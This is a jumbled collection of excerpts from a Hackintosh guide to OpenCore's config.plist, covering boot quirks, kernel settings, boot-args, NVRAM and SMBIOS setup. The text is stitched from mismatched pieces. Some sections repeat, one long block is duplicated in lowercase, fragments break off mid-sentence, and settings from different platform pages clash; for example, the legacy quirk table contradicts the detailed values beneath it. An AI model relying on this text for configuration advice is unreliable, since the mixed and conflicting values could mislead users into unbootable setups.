calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, shouldn't be needed on Skylake and newer. Some firmware like Gigabyte may still require it, and will kernel panic without this\n   * Note newer Asus BIOS(v3006+) will not boot with this quirk enabled\n * SyncRuntimePermissions: YES\n   * Fixes alignment with MAT tables and required to boot Windows and Linux with MAT tables, also recommended for macOS. Mainly relevant for RebuildAppleMemoryMap users\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nBy default, the Sample.plist has this section set for audio which we'll be setting up by setting the layout ID in the boot-args section, so removal of PciRoot(0x0)/Pci(0x1b,0x0) is also recommended from the Add section.\n\nTL;DR, delete all the PciRoot's here as we won't be using this section.\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for.

Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

following:\n\nquirk                    enabled   comment\ndevirtualisemmio         yes       \nenablewriteunprotector   no        \nrebuildapplememorymap    yes       \nsetupvirtualmap          yes

fixes uefi runtime services like date, time, nvram, power control, etc\n * devirtualisemmio: yes\n   * reduces stolen memory footprint, expands options for slide=n values and very helpful with fixing memory allocation issues on z390. requires protectuefiservices as well on icelake and z390 coffee lake\n * enablesafemodeslide: yes\n   * enables slide variables to be used in safe mode.\n * enablewriteunprotector: no\n   * this quirk and rebuildapplememorymap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * however, due to issues with oems not using the latest edkii builds you may find that the above combo will result in early boot failures. this is due to missing the memory_attribute_table and such we recommend disabling rebuildapplememorymap and enabling enablewriteunprotector. more info on this is covered in the troubleshooting section\n * providecustomslide: yes\n   * used for slide variable calculation. however the necessity of this quirk is determined by ocabc: only n/256 slide values are usable! message in the debug log. if the message ocabc: all slides are usable! you can disable providecustomslide! is present in your log, you can disable providecustomslide.\n * rebuildapplememorymap: yes\n   * generates memory map compatible with macos, can break on some laptop oem firmwares so if you receive early boot failures disable this\n * setupvirtualmap: yes\n   * fixes setvirtualaddresses calls to virtual addresses, shouldn't be needed on skylake and newer. some firmware like gigabyte may still require it, and will kernel panic without this\n   * note newer asus bios(v3006+) will not boot with this quirk enabled\n * syncruntimepermissions: yes\n   * fixes alignment with mat tables and required to boot windows and linux with mat tables, also recommended for macos. mainly relevant for rebuildapplememorymap users\n\n\n# deviceproperties\n\n\n\n\n# add\n\nsets device properties from a map.\n\nby default, the sample.plist has this section set for audio which we'll be setting up by setting the layout id in the boot-args section, so removal of pciroot(0x0)/pci(0x1b,0x0) is also recommended from the add section.\n\ntl;dr, delete all the pciroot's here as we won't be using this section.\n\n\n# delete\n\nremoves device properties from the map, for us we can ignore this\n\n\n# kernel\n\n\n\n\n#

32-bit cpus please see below:\n\nmore in-depth info\n\nthe main thing you need to keep in mind is:\n\n * load order\n   * remember that any plugins should load after its dependencies\n   * this means kexts like lilu must come before virtualsmc, applealc, whatevergreen, etc\n\na reminder that propertree users can run cmd/ctrl + shift + r to add all their kexts in the correct order without manually typing each kext out.\n\n * arch\n   * architectures supported by this kext\n   * currently supported values are any, i386 (32-bit), and x86_64 (64-bit)\n * bundlepath\n   * name of the kext\n   * ex: lilu.kext\n * enabled\n   * self-explanatory, either enables or disables the kext\n * executablepath\n   * path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting show package contents. generally, they'll be contents/macos/kext but some have kexts hidden within under plugin folder. do note that plist only kexts do not need this filled in.\n   * ex: contents/macos/lilu\n * minkernel\n   * lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for os x 10.8\n * maxkernel\n

quirks\n\ninfo\n\nsettings relating to the kernel, for us we'll be enabling the following:\n\nquirk                     enabled   comment\napplexcpmcfglock          yes       not needed if cfg-lock is disabled in the bios\ndisableiomapper           yes       not needed if vt-d is disabled in the bios\nlapickernelpanic          no        hp machines will require this quirk\npanicnokextdump

can't be disabled in bios\n   * only applicable for ivy bridge and older\n     * note: broadwell and older require this when running 10.10 or older\n * applexcpmcfglock: yes\n   * only needed when cfg-lock can't be disabled in bios\n   * only applicable for haswell and newer\n     * note: ivy bridge-e is also included as it's xcpm capable\n * customsmbiosguid: no\n   * performs guid patching for updatesmbiosmode set to custom. usually relevant for dell laptops\n   * enabling this quirk with updatesmbiosmode custom mode can also disable smbios injection into \"non-apple\" oses however we do not endorse this method as it breaks bootcamp compatibility. use at your own risk\n * disableiomapper: yes\n   * needed to get around vt-d if either unable to disable in bios or needed for other operating systems, much better alternative to dart=0 as sip can stay on in catalina\n * disablelinkeditjettison: yes\n   * allows lilu and others to have more reliable performance without keepsyms=1\n * disablertcchecksum: no\n   * prevents applertc from writing to primary checksum (0x58-0x59), required for users who either receive bios reset or are sent into safe mode after reboot/shutdown\n * extendbtfeatureflags no\n   * helpful for those having continuity issues with non-apple/non-fenvi cards\n * lapickernelpanic: no\n   * disables kernel panic on ap core lapic interrupt, generally needed for hp systems. clover equivalent is kernel lapic\n * legacycommpage: no\n   * resolves ssse3 requirement for 64 bit cpus in macos, mainly relevant for 64-bit pentium 4 cpus(ie. prescott)\n * panicnokextdump: yes\n   * allows for reading kernel panics logs when kernel panics occur\n * powertimeoutkernelpanic: yes\n   * helps fix kernel panics relating to power changes with apple drivers in macos catalina, most notably with digital audio.\n * setapfstrimtimeout: -1\n   * sets trim timeout in microseconds for apfs filesystems on ssds, only applicable for macos 10.14 and newer with problematic ssds.\n * xhciportlimit: yes\n   * this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n# boot\n\ninfo\n\nquirk           enabled   comment\nhideauxiliary   yes       press space to show macos recovery and other auxiliary\n                          entries\n\nmore in-depth info\n * hideauxiliary: yes\n   * this option will hide supplementary entries, such as macos recovery and tools, in the picker. hiding auxiliary entries may increase boot performance on multi-disk systems. you can press space at the picker to show these entries\n\n\n# debug\n\ninfo\n\nhelpful for debugging opencore boot issues(we'll be changing everything but displaydelay):\n\nquirk             enabled\nappledebug        yes\napplepanic        yes\ndisablewatchdog   yes\ntarget            67\n\nmore in-depth info\n * appledebug: yes\n   * enables boot.efi logging, useful for debugging. note this is only supported on 10.15.4 and newer\n * applepanic: yes\n   * attempts to log kernel panics to disk\n * disablewatchdog: yes\n   * disables the uefi watchdog, can help with early boot issues\n * displaylevel: 2147483650\n   * shows even more debug information, requires debug version of opencore\n * sysreport: no\n   * helpful for debugging such as dumping acpi tables\n   * note that this is limited to debug versions of opencore\n * target: 67\n   * shows more debug information, requires debug version of opencore\n\nthese values are based of those calculated in opencore debugging\n\n\n# security\n\ninfo\n\nsecurity is pretty self-explanatory, do not skip. we'll be changing the following:\n\nquirk                  enabled    comment\nallowsetdefault        yes        \nblacklistappleupdate   yes        \nscanpolicy             0          \nsecurebootmodel        default    leave this as default for opencore to automatically set the\n                                  correct value corresponding to your smbios. the next page\n                                  goes into more detail about this setting.\nvault                  optional   this is a word, it is not optional to omit this setting. you\n                                  will regret it if you don't set it to optional, note that it\n                                  is case-sensitive\n\nmore in-depth info\n\n * allowsetdefault: yes\n   \n   * allow ctrl+enter and ctrl+index to set default boot device in the picker\n\n * apecid: 0\n   \n   * used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information, requires debug version of opencore\n\n * vault: optional\n   \n   * we won't be dealing vaulting so we can ignore, you won't boot with this set to secure\n   * this is a word, it is not optional to omit this setting. you will regret it if you don't set it to optional, note that it is case-sensitive\n\n * scanpolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to security section for further details. will not boot usb devices with this set to default\n\n * securebootmodel: default\n   \n   * controls apple's secure boot functionality in macos, please refer to security section for further details.\n   * note: users may find upgrading opencore on an already installed system can result in early boot failures. to resolve this, see here: stuck on ocb: loadimage failed - security violation\n\n\n# serial\n\nused for serial debugging (leave everything as default).\n\n\n# tools\n\nused for running oc debugging tools like the shell, propertree's snapshot function will add these for you.\n\n\n# entries\n\nused for specifying irregular boot paths that can't be found naturally with opencore.\n\nwon't

conjunction with rtcmemoryfixup, see here for more info: fixing rtc write issues\n   * most users can ignore this section\n\n7c436110-ab2a-4bbb-a880-fe41995c9f82\n\nsystem integrity protection bitmask\n\n * general purpose boot-args:\n\nboot-args     description\n-v            this enables verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args        description\nagdpmod=pikera   used for disabling board id checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the hardware video encoder\nradpg=15         used for disabling some power-gating modes, helpful for\n                 properly initializing amd cape verde based gpus\nunfairgva=1      used for fixing hardware drm support on supported amd gpus\nnvda_drv_vrl=1   used for enabling nvidia's web drivers on maxwell and pascal\n                 cards in macos sierra and high sierra\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add

customsmbiosguid quirk\n   * setting to custom with customsmbiosguid quirk enabled can also disable smbios injection into \"non-apple\" oses however we do not endorse this method as it breaks bootcamp compatibility. use at your own risk\n\n\n# uefi\n\n\n\nconnectdrivers: yes\n\n * forces .efi drivers, change to no will automatically connect added uefi drivers. this can make booting slightly faster, but not all drivers connect themselves. e.g. certain file system drivers may not load.\n\n\n# drivers\n\nadd your .efi drivers here.\n\nonly drivers present here should be:\n\n * hfsplus.efi\n *

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-XOSI        Makes all _OSI calls specific to Windows work for macOS\n                 (Darwin) Identifier. This may help enabling some features\n                 like XHCI and others.\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\nLEGACY   UEFI\n         \n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, depending where your board has UEFI, you have 2 options depending what your motherboard supports:\n\n# Legacy Settings\n\nQUIRK                    ENABLED   COMMENT\nAvoidRuntimeDefrag       No        Big Sur may require this quirk enabled\nEnableSafeModeSlide      No        \nEnableWriteUnprotector   No        \nProvideCustomSlide       No        \nRebuildAppleMemoryMap    Yes       This is required to boot OS X 10.4 through 10.6\nSetupVirtualMap          No        \n\n# UEFI Settings\n\nQUIRK                   ENABLED   COMMENT\nRebuildAppleMemoryMap   Yes       This is required to boot OS X 10.4 through 10.6\n\nMore in-depth Info\n * AvoidRuntimeDefrag: NO\n   * Fixes UEFI runtime services like date, time, NVRAM, power control;\n   * macOS Big Sur however requires the APIC table present, otherwise causing early kernel panics so this quirk is recommended for those users.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Resolves early memory kernel panics on 10.6 and below.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, simply add the values below to the PciRoot(0x0)/Pci(0x2,0x0) entry:\n\nPROPERTY                   TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-singlelink     Data   01000000\n\n * Note: Apple's Iron Lake drivers only support LVDS displays and not eDP\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout.

By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi.

The typical breakdown is as follows:\n\nSMBIOS          CPU TYPE                  DISPLAY SIZE\nMacBookPro6,1   Quad Core 45W(High End)   17\"\nMacBookPro6,2   Quad Core 45W(Low End)    15\"\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #             MacBookPro6,1 SMBIOS Info               #\n#######################################################\n\nType:         MacBookPro6,1\nSerial:       C02G3ZYFDC79\nBoard Serial: C021291014NDCMVCB\nSmUUID:       C8A54C45-8E99-440A-9A52-1B62A0074FA5\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlusLegacy.efi\n * OpenRuntime.efi\n * OpenUsbKbDxe.efi(If your firmware does not support UEFI)\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

Most laptops have garbage firmwares so we'll need this as well\n\n * DisableSecurityPolicy: NO\n   \n   * Disables platform security policy in firmware, recommended for buggy firmwares where disabling Secure Boot does not allow 3rd party firmware drivers to load.\n   * If running a Microsoft Surface device, recommended to enable this option\n\n * RequestBootVarRouting: YES\n   \n   * Redirects AptioMemoryFix from EFI_GLOBAL_VARIABLE_GUID to OC_VENDOR_VARIABLE_GUID. Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory.

